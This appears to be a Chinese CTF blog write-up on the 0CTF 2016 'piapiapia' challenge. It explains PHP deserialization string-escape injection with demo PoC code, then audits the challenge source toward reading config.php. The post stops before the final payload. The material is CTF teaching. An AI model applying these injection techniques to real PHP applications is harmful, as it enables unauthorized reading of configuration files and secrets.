<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="备赛选择题大赛决赛之被迫成为web手"><meta name="keywords" content="web"><meta name="author" content="Alex"><meta name="copyright" content="Alex"><title>备赛选择题大赛决赛之被迫成为web手 | Alex's blog~</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Alex's blog~" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0CTF-2016-piapiapia"><span class="toc-number">1.</span> <span class="toc-text">[0CTF 2016]piapiapia</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E9%95%BF%E9%80%83%E9%80%B8"><span class="toc-number">1.1.1.</span> <span class="toc-text">反序列化字符串变长逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E7%9F%AD%E9%80%83%E9%80%B8"><span class="toc-number">1.1.2.</span> <span class="toc-text">反序列化字符串变短逃逸</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">题解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-PYWebsite"><span class="toc-number">2.</span> <span class="toc-text">[MRCTF2020]PYWebsite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-%E5%A5%97%E5%A8%83"><span class="toc-number">3.</span> <span class="toc-text">[MRCTF2020]套娃</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-5cb1e2bdc0644f9828029a94181f4542_1440w.jpg"></div><div class="author-info__name text-center">Alex</div><div class="author-info__description text-center">pwn</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">53</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">49</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://n0vice.top/">N0vice</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://snowywar.top/">魔法少女雪殇</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://l0ne1y.xyz/">L0ne1y</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn/">eeeeeeeeeeeeeeeea</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://giles-one.github.io/">cat03</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://ulrica66666.github.io/">ulrica66666</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alex's blog~</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">备赛选择题大赛决赛之被迫成为web手</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-26</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><ul>
<li>PHP反序列化字符逃逸</li>
</ul>
<p>PHP反序列化字符逃逸就是通过目标代码的一些操作改变序列化字符串的长度来导致反序列化漏洞。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="反序列化字符串变长逃逸"><a href="#反序列化字符串变长逃逸" class="headerlink" title="反序列化字符串变长逃逸"></a>反序列化字符串变长逃逸</h4><p>观察如下poc<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passsword</span> = <span class="string">&#x27;bbbb&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$tmp</span> = serialize(<span class="variable">$t</span>);</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"><span class="comment">// O:4:&quot;Test&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;aaaa&quot;;s:9:&quot;passsword&quot;;s:4:&quot;bbbb&quot;;&#125;</span></span><br><span class="line"><span class="variable">$tmp1</span> = filter(serialize(<span class="variable">$t</span>));</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp1</span>);</span><br></pre></td></tr></table></figure><br>我们在代码中加了一个filter函数，来将a替换为bb，我们分别用filter和不用filter序列化同一个对象观察结果。</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsfvltgmgj30xu02qq3c.jpg" alt=""></p>
<p>可以看到字符串变长了，那么我们思考，字符串变长会发生什么？</p>
<p>答：我们可以人为构造恶意数据，字符串变长意味着可以逃逸，因为由于s:4的存在，该成员变量只会读取后四个字符来作为该变量，导致过长的部分可以“顶到”后面去，那么我们就可以构造恶意数据来篡改其他成员变量的值，比如加上”;}之类的来闭合数据，看如下实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;bbbb&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$tmp</span> = serialize(<span class="variable">$t</span>);</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span> = unserialize(<span class="variable">$tmp</span>);</span><br><span class="line">printf(<span class="string">&quot;username-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;username);</span><br><span class="line">printf(<span class="string">&quot;password-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;password);</span><br></pre></td></tr></table></figure>
<p>我们尝试不加filter，然后正常序列化，发现构造的恶意数据逃逸不了，并不会因为双引号之类的特殊字符而造成闭合啥的</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsgcrtc4lj315e04k0u1.jpg" alt=""></p>
<p>如果我们加了filter会变成这样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;bbbb&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$tmp</span> = filter(serialize(<span class="variable">$t</span>));</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span> = unserialize(<span class="variable">$tmp</span>);</span><br><span class="line">printf(<span class="string">&quot;username-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;username);</span><br><span class="line">printf(<span class="string">&quot;password-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;password);</span><br></pre></td></tr></table></figure>
<p>因为<code>&#39;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#39;</code>长度为36，所以我们故意把filter把admin替换成长为36的字符串，这样就后面的<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#39;</code>就可以逃逸出去，顶替成为类的成员变量。</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsghr6fzrj31fk048dhb.jpg" alt=""></p>
<h4 id="反序列化字符串变短逃逸"><a href="#反序列化字符串变短逃逸" class="headerlink" title="反序列化字符串变短逃逸"></a>反序列化字符串变短逃逸</h4><p>先说核心思想，上文中提到的是字符串过长然后将恶意数据“顶出去”，从而将其他的类成员变量篡改；变短逃逸的核心原理是将字符串缩短，将php自己记录的数据当做字符串“缩回来”，从而使后面的恶意数据得以逃逸出去。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;abcdefghijklm&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先看如下filter，会将13个字符的字符串替换为空，为啥长度是13呢，是因为我们要将系统数据包含进去的长度<code>&quot;;s:8:&quot;password&quot;;s:34:&quot;abc&quot;</code>为26，正好是13的倍数，方便构造数据逃逸，我们且看下文。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;abcdefghijklm&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;abcdefghijklmabcdefghijklm&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;abc&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = serialize(<span class="variable">$t</span>);</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span> = unserialize(<span class="variable">$tmp</span>);</span><br><span class="line">printf(<span class="string">&quot;username-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;username);</span><br><span class="line">printf(<span class="string">&quot;password-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;password);</span><br></pre></td></tr></table></figure>
<p>首先还是没有加filter的情况，很正常。</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsh5xzygyj31c603iwf1.jpg" alt=""></p>
<p>加上filter我们观察一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;abcdefghijklm&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;abcdefghijklmabcdefghijklm&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;abc&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = serialize(<span class="variable">$t</span>);</span><br><span class="line">printf(<span class="string">&quot;%s\n&quot;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span> = unserialize(<span class="variable">$tmp</span>);</span><br><span class="line">printf(<span class="string">&quot;username-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;username);</span><br><span class="line">printf(<span class="string">&quot;password-&gt;%s\n&quot;</span>, <span class="variable">$t1</span>-&gt;password);</span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvsh8iacdmj31io09kdij.jpg" alt=""></p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>朴实无华的bootstrap风格的登录页面</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshe9fgsxj31hi0u040j.jpg" alt=""></p>
<p>sql盲测俩数据，发现不行，直接url栏里输入www.zip，wdnmd，真有源码，都不用扫的，👴🏻喜欢。</p>
<p>有如下文件，poc.php和info.php是我加的用来做测试用的。</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshfkfml7j30hc0o83zt.jpg" alt=""></p>
<p>发现config.php里面有flag</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshj58c7dj30hy08sdgf.jpg" alt=""></p>
<p>然后发现index.php是登录，并没有sql注入的地方，过滤的很好。</p>
<p>然后有注册功能，我们先按正常业务走走。</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshgtzwwoj30w40oimy8.jpg" alt=""></p>
<p>注册个账号</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshhboehjj30kg0l8q3s.jpg" alt=""></p>
<p>然后登录</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshhvwfo0j30r20vajst.jpg" alt="">登录成功后发现可以进行profile文件的更改，那漏洞大概在这没跑了，我们进到源码里面审计一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">			&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">			&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">			&lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Photo:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshkdrp46j31540fk0vd.jpg" alt=""></p>
<p>文件上传的地方看似没有校验文件类型，但是我们传php文件上去会被md5，后缀会被🐑了，所以没法利用。</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshlh1tu8j30x4066753.jpg" alt=""></p>
<p>信息输入完成后会调用update_profile函数，序列化profile数组，我们进去看看</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshmsbnpwj30yc0aegmr.jpg" alt=""></p>
<p>会做filter处理，serialize + filter，DNA动了</p>
<p>处理完会update到数据库里面，然后转到profile.php显示信息：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span> = <span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;unserialize:&quot;</span> . <span class="variable">$profile</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">        &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;</span><br><span class="line">        &lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">        &lt;h3&gt;Hi <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$nickname</span>; <span class="meta">?&gt;</span>&lt;/h3&gt;</span><br><span class="line">        &lt;label&gt;Phone: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$phone</span>; <span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">        &lt;label&gt;Email: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$email</span>; <span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;/html&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个地方会首先反序列化，然后可以读文件。</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvshrknyugj30xu0bwq4j.jpg" alt=""></p>
<p>那么思路顿时清晰了起来，反序列化的变量我们是可控的，在update.php的那个地方我们能够填写表单来控制，然后我们如果把$profile[‘photo’]给改写成config.php那么这个题就做出来了。</p>
<p>回到我们可控的点update.php处，我们观察一些filter</p>
